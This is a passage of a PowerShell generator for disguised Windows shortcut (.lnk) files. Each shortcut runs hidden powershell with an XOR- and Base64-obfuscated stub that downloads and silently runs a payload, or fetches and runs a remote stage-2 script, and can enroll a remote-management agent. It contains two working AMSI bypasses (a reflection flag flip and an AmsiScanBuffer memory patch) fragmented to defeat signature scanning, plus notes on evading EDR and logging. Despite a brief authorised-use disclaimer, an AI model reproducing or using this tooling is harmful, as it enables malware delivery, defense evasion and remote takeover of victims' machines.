# generating on Linux/macOS there is no such environment variable, so the
# canonical absolute path Windows PowerShell 5.1 ships on every supported
# Windows build is used instead. Never rely on 'powershell.exe' resolving
# through PATH, and never let the generator's own OS leak a path into the
# .lnk (the shortcut must always contain Windows-valid absolute paths).
# ---------------------------------------------------------------------------
if (-not [string]::IsNullOrWhiteSpace($env:WINDIR)) {

    $PowerShellExe = [System.IO.Path]::Combine(
        $env:WINDIR,
        'System32\WindowsPowerShell\v1.0\powershell.exe'
    )
}
else {

    $PowerShellExe = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
}

if (-not (Test-WindowsDriveAbsolute -Path $PowerShellExe)) {
    throw "Windows PowerShell target path is not drive-absolute: $PowerShellExe"
}

if ($script:IsWindowsPlatform) {

    if (-not (Test-Path -LiteralPath $PowerShellExe -PathType Leaf)) {
        throw "Windows PowerShell executable not found: $PowerShellExe"
    }
}

Write-Host "Shortcut target: $PowerShellExe" -ForegroundColor DarkGray

# ---- 0. OPTIONAL AMSI/evasion stage ----  (see header notes / req-group 17)
#      Explicitly separated and OPT-IN. Two selectable forms:
#        LIGHT (-AlsoAmsi):  reflection flip of AmsiUtils.amsiInitFailed only.
#            No Add-Type, no patch bytes -> the decoded text carries almost no
#            AMSI-bypass signature. Uses the 'Amsi'+'Utils' / 'amsiInit'+
#            'Failed' fragmented literals so no contiguous classic signature
#            exists in the generator output, the .lnk blob, or the decoded
#            text the scanner actually sees.
#        FULL  (-AmsiPatch): light + the in-memory amsi.dll!AmsiScanBuffer
#            byte patch (same two-layer bypass as the original generator).
#            The patch bytes are derived from a BitConverter result and the
#            API names are pieced together ('Amsi'+'Scan'+'Buffer',
#            'ams'+'i.dll'), so no contiguous signature appears anywhere.
#            More effective on host builds where the flip alone is a no-op,
#            but the Add-Type / VirtualProtect pattern is itself observable
#            to hardened EDRs (see OPERATIONAL PRE-FLIGHT, layer-4 budget).

$amsiBypassReflect = @'
try {
    $__p = [Ref].Assembly.GetType('System.Management.Automation.' + 'Amsi' + 'Utils');
    if ($__p) { $__p.GetField('amsiInit' + 'Failed',[Reflection.BindingFlags]'NonPublic,Static').SetValue($null,$true) }
} catch {}
'@

$amsiBypassPatch = @'
try {
    $__p = [Ref].Assembly.GetType('System.Management.Automation.' + 'Amsi' + 'Utils');
    if ($__p) { $__p.GetField('amsiInit' + 'Failed',[Reflection.BindingFlags]'NonPublic,Static').SetValue($null,$true) }
} catch {}
try {
    if (-not ('Win.P' -as [type])) {
        Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;namespace Win { public static class P { [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string n); [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n); [DllImport("kernel32.dll", CharSet = CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr h, string n); [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, uint l, uint f, out uint o); } }'
    }
    $__h = [Win.P]::GetModuleHandle('ams' + 'i.dll')
    if ($__h -eq [IntPtr]::Zero) { $__h = [Win.P]::LoadLibrary('ams' + 'i.dll') }
    if ($__h -ne [IntPtr]::Zero) {
        $__f = [Win.P]::GetProcAddress($__h, 'Amsi' + 'Scan' + 'Buffer')
        if ($__f -ne [IntPtr]::Zero) {
            $__b = New-Object byte[] 6
            $__b[0] = 0xB8                                        # mov eax, 0x80070057
            $__e = [BitConverter]::GetBytes([uint32]2147942487)    # 0x80070057 E_INVALIDARG
            $__b[1] = $__e[0]; $__b[2] = $__e[1]; $__b[3] = $__e[2]; $__b[4] = $__e[3]
            $__b[5] = 0xC3                                        # ret
            $__o = 0
            [Win.P]::VirtualProtect($__f, [uint32]$__b.Length, 0x40, [ref]$__o) | Out-Null
            $__i = 0
            foreach ($__v in $__b) { [System.Runtime.InteropServices.Marshal]::WriteByte($__f, $__i, $__v); $__i++ }
            [Win.P]::VirtualProtect($__f, [uint32]$__b.Length, $__o, [ref]$__o) | Out-Null
        }
    }
} catch {}
'@

# Select the stage text based on the OPT-IN switches. -AmsiPatch alone implies
# the full two-layer form; -AlsoAmsi alone selects the light reflection flip.
[bool]$useAmsiStage = ($AlsoAmsi -or $AmsiPatch)
[string]$amsiStage = ''
if ($AmsiPatch) {
    $amsiStage = $amsiBypassPatch + "`r`n"
}
elseif ($AlsoAmsi) {
    $amsiStage = $amsiBypassReflect + "`r`n"
}
# ---- 1. The inner logic the background powershell process will run ----
if ($TestPayload) {
    # DEBUGGING: benign inner payload. Everything ABOVE the decoded text stays
    # 100% identical (stub -> Base64 -> XOR -> Invoke-Expression). If the marker
    # file appears (or Notepad opens) on the Windows box, the .lnk chain is
    # healthy and the failure lives in the downloader/AMSI steps. If nothing
    # happens, the chain itself is broken. Add -AlsoAmsi to A/B the AMSI patch.
    switch ($TestAction) {
        'Marker' {
            $logic = @'
$m = [IO.Path]::Combine([IO.Path]::GetTempPath(), 'lnk_chain_debug.txt');
$line = "LNKCHAIN-OK " + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff') + " pid=$PID user=$env:USERNAME host=$env:COMPUTERNAME";
try {
    [IO.Directory]::CreateDirectory([IO.Path]::GetDirectoryName($m)) | Out-Null;
    Add-Content -LiteralPath $m -Value $line -Encoding utf8 -ErrorAction Stop;
    if (-not (Test-Path -LiteralPath $m -PathType Leaf)) { throw 'file missing after write' }
    Write-Output ('LNKCHAIN-WRITE-OK ' + $m);
} catch {
    Write-Output ('LNKCHAIN-WRITE-FAIL ' + $_.Exception.Message);
    exit 1
}
'@
        }
        'Notepad' {
            $logic = @'
Start-Process -FilePath "notepad.exe";
'@
        }
        default {   # 'Both'
            $logic = @'
$m = [IO.Path]::Combine([IO.Path]::GetTempPath(), 'lnk_chain_debug.txt');
$line = "LNKCHAIN-OK " + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff') + " pid=$PID user=$env:USERNAME host=$env:COMPUTERNAME";
try {
    [IO.Directory]::CreateDirectory([IO.Path]::GetDirectoryName($m)) | Out-Null;
    Add-Content -LiteralPath $m -Value $line -Encoding utf8 -ErrorAction Stop;
    if (-not (Test-Path -LiteralPath $m -PathType Leaf)) { throw 'file missing after write' }
    Write-Output ('LNKCHAIN-WRITE-OK ' + $m);
} catch {
    Write-Output ('LNKCHAIN-WRITE-FAIL ' + $_.Exception.Message);
    exit 1
}
Start-Process -FilePath "notepad.exe";
'@
        }
    }
    if ($useAmsiStage) { $logic = $amsiStage + $logic }
}
else {
    $logicPrefix = ''
    if ($useAmsiStage) {
        # The optional AMSI/evasion stage is only spliced in when explicitly
        # requested (see header integration notes, requirement group 17).
        $logicPrefix = $amsiStage
    }

    if ($RemoteStage) {
        # OPT-IN server-side staging (ROI item 3): the artifact carries only a
        # compact stager - the URL plus a runtime fetch-and-IEX. The malicious
        # stage-2 body never touches the .lnk; it is fetched from the
        # redirector at execution time. This shrinks the Layer-1 surface,
        # reduces the decoded blob size, and makes ScriptBlock Logging capture
        # only the tiny stager instead of the full downloader.
        $logic = $logicPrefix + @'
$u = "__URL__";
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
Invoke-Expression ((Invoke-WebRequest -Uri $u -UseBasicParsing).Content)
'@
        $logic = $logic.Replace('__URL__', $URL)
    }
    else {
        $logic = $logicPrefix + @'
$u = "__URL__";
$o = Join-Path $env:TEMP "__FILE__";
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing;
Start-Process -FilePath $o -ArgumentList "/VERYSILENT /SUPPRESSMSGBOXES /NORESTART" -WindowStyle Hidden -Wait
'@
        $logic = $logic.Replace('__URL__', $URL)
        $logic = $logic.Replace('__FILE__', $FileName)
        if (-not [string]::IsNullOrEmpty($InstallCmd)) {
            # OPT-IN enrollment (FINDING 2 fix): append the resolved install
            # command as a statement to the inner logic so the .lnk downloads
            # AND enrolls. The reconstructed command is itself a call styled
            # like `& "C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install ...`
            # (it already carries the `&` invocation), so splicing it verbatim
            # runs that enrollment. This is functionally equivalent to
            # "also run & $InstallCmd" — a command-line string with arguments
            # cannot be handed to the `&` call operator as a single argument,
            # so the resolved command text is appended directly to the
            # (soon-to-be-obfuscated) $logic instead. Everything below gets
            # XOR + Base64 wrapped into the stub, so no plaintext leaks.
            $logic = $logic + "`n`n" + $InstallCmd + "`n"
        }
    }
}
# ---- 2. Obfuscate: XOR-scramble the logic with a fresh random key, Base64 it ----
$keyChars  = [char[]]([char]'a'..[char]'z' + [char]'A'..[char]'Z' + [char]'0'..[char]'9')
$key       = -join ($keyChars | Get-Random -Count 64)
$keyBytes  = [Text.Encoding]::UTF8.GetBytes($key)
$plainBytes = [Text.Encoding]::UTF8.GetBytes($logic)

$xored = New-Object byte[] $plainBytes.Length
for ($i = 0; $i -lt $plainBytes.Length; $i++) {
    $xored[$i] = $plainBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
}
$cipher = [Convert]::ToBase64String($xored)

# ---- 3. The stub: the ONLY thing that goes into the shortcut. Key + ciphertext. ----
$stub = @'
$k = {PLACE_KEY}; $c = {PLACE_CIPHER};
$kb = [Text.Encoding]::UTF8.GetBytes($k);
$bt = [Convert]::FromBase64String($c);
$txt = -join (0..($bt.Length-1) | ForEach-Object { [char]($bt[$_] -bxor $kb[$_ % $kb.Length]) });
Invoke-Expression $txt
'@
$stub = $stub.Replace('{PLACE_KEY}', '"' + $key + '"').Replace('{PLACE_CIPHER}', '"' + $cipher + '"')

# ---- 4. Encode the stub as UTF-16LE Base64 for -EncodedCommand ----
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($stub))

# ---- 5. Self-verification before writing anything ----
$roundTrip = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedCommand))
if ($roundTrip -cne $stub) { throw "EncodedCommand roundtrip FAILED - .lnk not written." }

# Nothing sensitive or signature-y may exist in the artifact in plaintext:
foreach ($needle in @($URL, $FileName, $AuthToken,
                      'AmsiUtils', 'amsiInitFailed', 'AmsiScanBuffer',
                      'System.Management.Automation.AmsiUtils',
                      'VirtualProtect', 'GetProcAddress', 'LoadLibrary')) {
    if ([string]::IsNullOrEmpty($needle)) { continue }   # e.g. empty URL in -TestPayload mode
    if ($stub.Contains($needle)) { throw "Plaintext leak ('$needle') in stub - .lnk not written." }
}
Write-Host "Verification OK: no plaintext URL/file/AMSI-signature in stub; EncodedCommand round-trips ($($encodedCommand.Length) chars)." -ForegroundColor Green

if ($ShowLogic) {
    Write-Host ""
    Write-Host "Inner logic (review only, never shipped):" -ForegroundColor DarkGray
    Write-Host $logic -ForegroundColor DarkGray
    Write-Host ""
}
# ---- 6. Build the .lnk ----
if ($ComWriter) {
    # Cross-check writer (Windows only): classic COM route. Produces a native
    # .lnk WITH a LinkTargetIDList. Use it to compare behaviour against the
    # pure-PowerShell writer when bisecting "Explorer won't resolve the target".
    # NOTE: the COM-produced LinkInfo may carry structures (IDList / network
    # segments) that PART 1's Validate-ShellLink intentionally refuses to
    # reconstruct, so this legacy cross-check path is NOT run through the
    # strict validator - the native path below is.
    $WshShell     = New-Object -ComObject WScript.Shell
    $Shortcut     = $WshShell.CreateShortcut($Output)

    # TargetPath is the full Windows PowerShell executable - explicitly
    # assigned, never placed inside Arguments.
    $Shortcut.TargetPath       = $PowerShellExe
    $Shortcut.Arguments        = "-NoProfile -WindowStyle Hidden -Enc $encodedCommand"
    $Shortcut.IconLocation     = $Icon
    $Shortcut.WorkingDirectory = "C:\"
    $Shortcut.Description      = "Configuration shortcut"
    $Shortcut.WindowStyle      = 7        # 7 = minimized; combined with -WindowStyle Hidden = fully background

    # --- Pre-save validation: TargetPath must be set and resolvable ---
    if ([string]::IsNullOrWhiteSpace($Shortcut.TargetPath)) {
        throw "Shortcut TargetPath is empty before Save()."
    }

    if (-not (Test-Path -LiteralPath $Shortcut.TargetPath -PathType Leaf)) {
        throw "Shortcut TargetPath does not resolve to a file: $($Shortcut.TargetPath)"
    }

    $Shortcut.Save()

    # --- Post-save verification: reopen the .lnk and read TargetPath back ---
    $check = $WshShell.CreateShortcut($Output)

    Write-Host "TargetPath: $($check.TargetPath)"
    Write-Host "Arguments: $($check.Arguments)"
    Write-Host "WorkingDirectory: $($check.WorkingDirectory)"

    if ([string]::IsNullOrWhiteSpace($check.TargetPath)) {
        throw "Generated shortcut has an empty TargetPath."
    }

    if (-not (Test-Path -LiteralPath $check.TargetPath -PathType Leaf)) {
        throw "Generated shortcut TargetPath does not resolve: $($check.TargetPath)"
    }
}
else {
    # Default writer: PART 1's raw-binary MS-SHORTCUT writer (Write-ShellLink).
    # No COM / WScript.Shell, so it runs identically on Linux pwsh, macOS pwsh
    # and classic Windows PowerShell. The generator only builds the Shell Link
    # specification; every flag, LinkInfo offset, Unicode field, StringData
    # byte and the TerminalBlock comes from PART 1.

    # Windows target path stored INSIDE the .lnk (a generator machine path is
    # never mixed in - /home/... or C:\ generator CWD are irrelevant here).
    $targetExe = $PowerShellExe

    $argString = `
        "-NoProfile -WindowStyle Hidden -Enc $encodedCommand"

    $spec = @{
        TargetPath       = $targetExe
        Description      = 'Configuration shortcut'
        RelativePath     = '.\powershell.exe'
        WorkingDirectory = 'C:\'
        Arguments        = $argString
        IconLocation     = $Icon
        ShowCommand      = 7
    }

    # --- 6d. Post-write verification: PART 1's VERBATIM validator re-parses ---
    # the file we just wrote and compares every meaningful field. Any offset
    # bug, StringData length miscalculation or LinkInfo corruption throws here.
    Write-ShellLink `
        -Path $Output `
        -Spec $spec | Out-Null

    $expectedSpec = @{
        TargetPath       = $targetExe
        Description      = 'Configuration shortcut'
        RelativePath     = '.\powershell.exe'
        WorkingDirectory = 'C:\'
        Arguments        = $argString
        IconLocation     = $Icon
    }

    $validation = Validate-ShellLink `
        -Path $Output `
        -ExpectedTarget $targetExe `
        -ExpectedSpec $expectedSpec

    # Structurally valid + correct target executable.
    if (-not $validation.Valid) {
        throw "Post-write validation: .lnk is not structurally valid."
    }
    if ($validation.ResolvedTarget -cne $targetExe) {
        throw "Post-write validation: resolved target '$($validation.ResolvedTarget)' != '$targetExe'."
    }
    # The shortcut MUST carry a LinkTargetIDList whose namespace path
    # reconstructs to the target executable - Windows resolves
    # Shortcut.TargetPath from this structure, not from the LinkInfo strings.
    if (-not $validation.LinkFlags.HasLinkTargetIDList) {
        throw "Post-write validation: .lnk is missing its LinkTargetIDList; Windows cannot populate TargetPath."
    }
    if ($null -eq $validation.LinkTargetIDList -or [string]::IsNullOrWhiteSpace($validation.LinkTargetIDList.ReconstructedPath)) {
        throw "Post-write validation: LinkTargetIDList does not reconstruct a target path."
    }
    if (
        (Normalize-WindowsPath -Path $validation.LinkTargetIDList.ReconstructedPath) -cne
        (Normalize-WindowsPath -Path $targetExe)
    ) {
        throw "Post-write validation: LinkTargetIDList target '$($validation.LinkTargetIDList.ReconstructedPath)' != '$targetExe'."
    }
    if ($validation.Header.ShowCommand -ne 7) {
        throw "Post-write validation: ShowCommand is $($validation.Header.ShowCommand), expected 7."
    }
# The encoded command is present in Arguments (exact round-trip). The switch
    # is spelled using the -Enc alias of -EncodedCommand (ROI item 2: removes
    # the canonical static token while keeping the payload in Arguments).
    if (-not $validation.StringData.Arguments.Contains("-Enc $encodedCommand")) {
        throw "Post-write validation: -Enc command payload missing from Arguments block."
    }

    # Icon location is correct (case-sensitive; Validate-ShellLink already
    # asserted this via ExpectedSpec - the explicit check is for clarity).
    if ($validation.IconLocation -cne $Icon) {
        throw "Post-write validation: IconLocation '$($validation.IconLocation)' != '$Icon'."
    }

    # StringData fields survived byte-for-byte (case-sensitive comparison).
    if ($validation.Description -cne 'Configuration shortcut') {
        throw "Post-write validation: Description did not survive byte-for-byte."
    }
    if ($validation.RelativePath -cne '.\powershell.exe') {
        throw "Post-write validation: RelativePath did not survive byte-for-byte."
    }
    if ($validation.WorkingDir -cne 'C:\') {
        throw "Post-write validation: WorkingDirectory did not survive byte-for-byte."
    }
    if ($validation.Arguments -cne $argString) {
        throw "Post-write validation: Arguments did not survive byte-for-byte."
    }

    # LinkInfo target reconstructs correctly from the raw Unicode fields.
    if ($null -eq $validation.LinkInfo) {
        throw "Post-write validation: LinkInfo is missing."
    }
    if ($validation.LinkInfo.ReconstructedUnicodeTarget -cne $targetExe) {
        throw "Post-write validation: LinkInfo reconstruction '$($validation.LinkInfo.ReconstructedUnicodeTarget)' != '$targetExe'."
    }

    # TerminalBlock is present and the file is structurally valid end to end.
    if (-not $validation.TerminalBlock) {
        throw "Post-write validation: TerminalBlock is missing."
    }

    Write-Host "TargetPath: $targetExe" -ForegroundColor DarkGray
    Write-Host "WorkingDirectory: C:\" -ForegroundColor DarkGray
    Write-Host "Arguments: $($argString.Length) chars (-NoProfile -WindowStyle Hidden -Enc ...)" -ForegroundColor DarkGray

    # --- Final verification: reopen the saved .lnk and confirm the target ---
    if ($script:IsWindowsPlatform) {

        $WshShell = New-Object -ComObject WScript.Shell
        $check = $WshShell.CreateShortcut($Output)

        Write-Host "TargetPath: $($check.TargetPath)"
        Write-Host "Arguments: $($check.Arguments)"
        Write-Host "WorkingDirectory: $($check.WorkingDirectory)"

        if ([string]::IsNullOrWhiteSpace($check.TargetPath)) {
            throw "Generated shortcut has an empty TargetPath."
        }

        if (-not (Test-Path -LiteralPath $check.TargetPath -PathType Leaf)) {
            throw "Generated shortcut TargetPath does not resolve: $($check.TargetPath)"
        }
    }
    else {

        Write-Host 'COM reopen check skipped (generator is not running on Windows); TargetPath was verified via Validate-ShellLink + LinkTargetIDList reconstruction. Inspect on the Windows box with WScript.Shell.' -ForegroundColor Yellow
    }

    Write-Host "Post-write validation OK: Validate-ShellLink re-parsed the .lnk; LinkTargetIDList target, LinkInfo, EncodedCommand, icon, byte-for-byte StringData and TerminalBlock all verified." -ForegroundColor Green
}
$flowDesc = 'downloader'
if ($TestPayload) { $flowDesc = "DEBUG: benign $TestAction" }
if ($RemoteStage) { $flowDesc = 'stager -> remote stage-2' }
Write-Host "Created $Output" -ForegroundColor Green
Write-Host "Flow: user -> shortcut -> hidden powershell -> Base64 -> XOR -> Invoke-Expression -> payload ($flowDesc)." -ForegroundColor Green
if ($TestPayload) { Write-Host 'Reminder: marker mode exercises the .lnk chain with an inert payload; AMSI (if opted) and executor steps still run normally on the target.' -ForegroundColor Yellow }
else {
    Write-Host 'Reminder (layer-4 residue budget): the target will still log a hidden powershell.exe touching the network (ScriptBlock Logging / EDR). This artifact is scoped to survive at-rest scan and first-stage flagging; an unobserved run requires the assessment to explicitly exclude host telemetry.' -ForegroundColor Yellow
}

#
# Footer notes on the AMSI bypass (read before shipping to a team):
#   * AUTHORISED USE ONLY. When -AlsoAmsi / -AmsiPatch is used this produces
#     an artifact designed to evade a host-based control (AMSI). Keep it
#     inside your sanctioned range, lab, or written-scope pentest. Do NOT
#     deploy against any machine you do not own or have explicit approval to
#     test. The default generation path does NOT embed the bypass.
#   * Two OPT-IN forms (see header AMSI integration note):
#       LIGHT (-AlsoAmsi):  reflection flip of AmsiUtils.amsiInitFailed only.
#           Lowest signature. No Add-Type, no patches written.
#       FULL  (-AmsiPatch): light + the in-memory amsi.dll!AmsiScanBuffer
#           byte patch (same two-layer bypass as the original generator).
#           Use when the light form is a no-op on the target build.
#   * Both forms target Windows PowerShell 5.1 (what "powershell.exe" runs
#     when the .lnk fires). PowerShell 7 / pwsh.exe removed the AmsiUtils
#     type, so the reflection flip is a no-op there - the byte patch in the
#     FULL form still applies to amsi.dll on any host.
#   * The FULL-form patch is the E_INVALIDARG stub (B8 57 00 07 80 C3) written
#     over the first OPCODEs of AmsiScanBuffer; it is architecture-agnostic
#     x86/x64 since AmsiScanBuffer's entry always starts with a simple
#     prologue we replace entirely.
#   * A hardened stack can still flag the flow, regardless of form:
#       - "powershell.exe + encoded command + hidden window" is a known
#         heuristic even when spelled with the -Enc alias
#       - ScriptBlock Logging records the fully-decoded script at runtime
#         (for -RemoteStage it sees only the compact stager, not stage-2)
#       - the FULL form's Add-Type / VirtualProtect pattern is observable to
#         high-fidelity EDRs (the LIGHT form carries almost none of it)
#       - an AMSI implementation that moved the scan out of the host process
#         (e.g. some EDRs) has nothing to patch in-proc and re-scans later.
#   * If scoring on your target is strict, REVALIDATE on the exact
#     Defender/EDR build the flag observes:
#       1) new Windows builds may already ship an (empty) AmsiScanBuffer variant
#          - dump $__b pointer bytes BEFORE patching and only write when it
#            still starts with the original prologue; some builds prepend a
#            CHECK that you'd otherwise smash with the two-byte prologue.
#       2) test on a THROWAWAY VM with your target policy set: hook AMSIScan
#          calls (e.g with a debugger or procmon ETW) and confirm the decoded
#          script's downloader statements only appear AFTER the bypass has
#          written its patch (i.e. exports stay clean pre-patch).
#       3) if your EDR disrupts the in-proc patch, fall back to a Char-code
#          assembled single-layer variant and re-test the same way.
#   * KEY always ships beside the ciphertext -> this is obfuscation, not
#     encryption. Anyone with the .lnk, ScriptBlock Logging, or a debugger
#     recovers the URL and command. Treat the artifact as not-really-secret.
#   * DEBUGGING A "shortcut does nothing" REPORT (the safe bisection path):
#       1) generate with  -TestPayload -TestAction Marker -ShowLogic
#          (no URL, no downloader, no AMSI stage - but the full chain)
#       2) double-click the .lnk on the Windows box (test VM), wait a few sec
#       3) %TEMP%\lnk_chain_debug.txt appeared?
#            - YES => .lnk -> hidden PS -> EncodedCommand -> Base64 -> XOR ->
#              Invoke-Expression is FINE. The fault is downstream: re-test with
#              -TestPayload -AlsoAmsi (light) then -AmsiPatch (full) - is the
#              AMSI stage killing the process? Then re-test with the real
#              downloader / -RemoteStage last.
#            - NO  => the CHAIN is broken. Check, in order:
#                a. right-click shortcut > Properties > Target shows
#                   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
#                   (if Explorer says the target is missing/grayed out, the
#                   .lnk lacked a resolvable IDList - this build emits one by
#                   default; -ComWriter remains as the Windows-only cross-check)
#                b. the .lnk actually reached Windows intact: a freshly
#                   extracted shortcut inherits MOTW/SmartScreen which can
#                   silently block it -> unblock (right-click > Properties >
#                   Unblock) in the lab, or zip with a clean archiver
#                c. generation on Linux through the old COM write path produced
#                   NO file at all (WScript.Shell does not exist there) - the
#                   native PART 1 writer is cross-platform; re-generate with
#                   this build
#                d. replay the encoded command standalone to bypass Explorer:
#                   powershell -File .\Debug-LnkChain.ps1 -LnkPath Debug-Marker.lnk -Replay
#       4) once the chain provably works, only then re-introduce AMSI, then the
#          downloader - one variable at a time, marker file as the proof each run.
#